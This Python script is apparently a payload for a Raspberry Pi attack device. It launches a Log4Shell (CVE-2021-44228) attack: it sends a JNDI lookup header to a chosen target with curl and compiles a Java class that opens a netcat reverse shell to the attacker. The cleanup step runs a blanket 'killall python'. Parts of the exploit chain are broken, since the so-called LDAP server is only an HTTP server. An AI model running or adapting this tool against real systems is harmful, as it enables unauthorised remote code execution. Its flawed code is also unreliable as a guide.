#!/usr/bin/env python3
"""
KTOx *payload* – **Log4Shell Attack**
==========================================
This payload performs a Log4Shell attack (CVE-2021-44228) by sending a
malicious JNDI lookup string to a vulnerable server.

**NOTE:** This is a very powerful exploit that can cause serious damage.
Use with extreme caution.

Features:
- Generates a malicious JNDI lookup string.
- Starts a malicious LDAP server to serve the exploit.
- The attack runs in a background thread.
- Graceful exit via KEY3 or Ctrl-C.

Controls:
- MAIN SCREEN:
    - OK: Start the attack.
    - KEY1: Edit the target URL.
    - KEY2: Edit the listener IP.
    - KEY3: Exit Payload.
"""

import sys
import os
import time
import signal
import subprocess
import threading
import socket

# Prefer /root/KTOx for imports; fallback to repo-relative
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

TARGET_URL = "http://example.com"
LISTENER_IP = "192.168.1.200"
running = True
attack_thread = None

PINS: dict[str, int] = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20, "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

def cleanup(*_):
    global running
    running = False
    
    # Kill all the processes
    subprocess.run("killall python", shell=True)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui(screen_state="main", message_lines=None):
    img = Image.new("RGB", (128, 128), (10, 0, 0))
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Log4Shell Attack", font=FONT_TITLE, fill=(30, 132, 73))
    d.line([(0, 22), (128, 22)], fill=(30, 132, 73), width=1)

    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (128 - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (128 - w) // 2
            d.text((x, y_offset), line, font=FONT, fill=(212, 172, 13))
            y_offset += 12
    elif screen_state == "main":
        d.text((5, 30), f"Target: {TARGET_URL}", font=FONT, fill=(242, 243, 244))
        d.text((5, 50), f"Listener: {LISTENER_IP}", font=FONT, fill=(242, 243, 244))
        d.text((5, 100), "OK=Attack", font=FONT, fill=(171, 178, 185))
        d.text((5, 110), "KEY1=Target | KEY2=Listener", font=FONT, fill=(171, 178, 185))
    elif screen_state == "attacking":
        d.text((5, 50), "Running attack...", font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 70), f"Target: {TARGET_URL}", font=FONT, fill=(242, 243, 244))
        d.text((5, 85), f"Listener: {LISTENER_IP}", font=FONT, fill=(242, 243, 244))

    LCD.LCD_ShowImage(img, 0, 0)

def run_attack():
    draw_ui("attacking")
    
    # Start malicious LDAP server
    ldap_server_thread = threading.Thread(target=run_ldap_server)
    ldap_server_thread.daemon = True
    ldap_server_thread.start()
    
    # Send malicious JNDI lookup string
    payload = f"${{jndi:ldap://{LISTENER_IP}:1389/a}}"
    
    try:
        subprocess.run(f"curl -H 'X-Api-Version: {payload}' {TARGET_URL}", shell=True)
        draw_ui(message_lines=["Attack sent!"])
    except Exception as e:
        draw_ui(message_lines=["Attack failed!", str(e)])
        
    time.sleep(3)

def run_ldap_server():
    # This is a simplified LDAP server that serves a malicious Java class.
    # In a real scenario, you would need a more robust LDAP server.
    
    # Create a malicious Java class
    java_class = """
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("nc -e /bin/bash <YOUR_SERVER_IP> 4444");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
"""
    with open("/tmp/Exploit.java", "w") as f:
        f.write(java_class)
        
    # Compile the Java class
    subprocess.run("javac /tmp/Exploit.java", shell=True)
    
    # Start the LDAP server
    subprocess.run(f"python -m http.server 8000 --directory /tmp", shell=True)
    
def handle_text_input_logic(initial_text, text_type):
    char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-/:?=&"
    if text_type == "Listener IP":
        char_set = "0123456789."
        
    char_index = 0
    input_text = ""
    
    while running:
        img = Image.new("RGB", (128, 128), (10, 0, 0))
        d = ImageDraw.Draw(img)
        d.text((5, 5), f"Enter {text_type}", font=FONT_TITLE, fill=(171, 178, 185))
        d.line([(0, 22), (128, 22)], fill=(171, 178, 185), width=1)
        d.text((5, 40), f"{text_type}: {input_text}", font=FONT, fill=(242, 243, 244))
        d.text((5, 70), f"Select: < {char_set[char_index]} >", font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 100), "UP/DOWN=Char | OK=Add", font=FONT, fill=(171, 178, 185))
        d.text((5, 115), "KEY1=Del | KEY2=Save | KEY3=Cancel", font=FONT, fill=(171, 178, 185))
        LCD.LCD_ShowImage(img, 0, 0)

        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        if btn == "OK":
            input_text += char_set[char_index]
            time.sleep(0.2)
        if btn == "KEY1":
            input_text = input_text[:-1]
            time.sleep(0.2)
        if btn == "UP":
            char_index = (char_index + 1) % len(char_set)
            time.sleep(0.2)
        if btn == "DOWN":
            char_index = (char_index - 1 + len(char_set)) % len(char_set)
            time.sleep(0.2)
        if GPIO.input(PINS["KEY2"]) == 0:
            if input_text:
                return input_text
            else:
                draw_ui(message_lines=["Input cannot be empty!"])
                time.sleep(2)
        
        time.sleep(0.1)
    return None

if __name__ == "__main__":
    try:
        while running:
            draw_ui("main")
            
            if GPIO.input(PINS["OK"]) == 0:
                attack_thread = threading.Thread(target=run_attack)
                attack_thread.start()
                time.sleep(0.3)
            
            if GPIO.input(PINS["KEY1"]) == 0:
                new_url = handle_text_input_logic(TARGET_URL, "Target URL")
                if new_url:
                    TARGET_URL = new_url
                time.sleep(0.3)

            if GPIO.input(PINS["KEY2"]) == 0:
                new_ip = handle_text_input_logic(LISTENER_IP, "Listener IP")
                if new_ip:
                    LISTENER_IP = new_ip
                time.sleep(0.3)

            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            time.sleep(0.1)
            
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Log4Shell Attack payload finished.")
